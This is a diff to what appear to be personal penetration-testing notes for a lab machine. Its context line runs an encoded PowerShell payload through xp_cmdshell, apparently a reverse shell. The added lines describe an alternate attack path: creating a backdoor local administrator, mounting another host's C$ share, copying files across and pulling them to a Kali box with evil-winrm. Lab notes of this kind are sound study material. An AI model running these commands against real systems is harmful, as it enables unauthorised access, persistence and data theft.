@@ -563,6 +563,28 @@ EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUA
 
 Im in, finally...
 
+For  this same box, apparently could have gone another path to copy files, I didn't do it but here are notes on it...also, has nothing to do with 1433 so probably doesn't really belong here, but whatever...:
+
+on ms01, create a local admin
+`net user agent password123! /add`
+`net localgroup administrators agent /add`
+
+on mos02, mount the default share C:\ from ms01 as Z:\ on ms02
+`net use Z: \\10.10.x.147\C$ /user:agent password123! /persistent:no`
+
+copy the files from ms02 to ms01
+`copy c:\files\on\ms02\blah.txt z:\to\ms01\location.txt`
+
+from kali
+`evil-winrm -i 192.168.x.147 -u agent -p password123!`
+
+download the files using evil-winrm
+`download C:\path\to\files\file.txt ./`
+
+exit evil-winrm and `ls -ltr` and your files should be there in that folder
+
+
+
 ```
 
 ### <ins>5901 - VNC</ins>
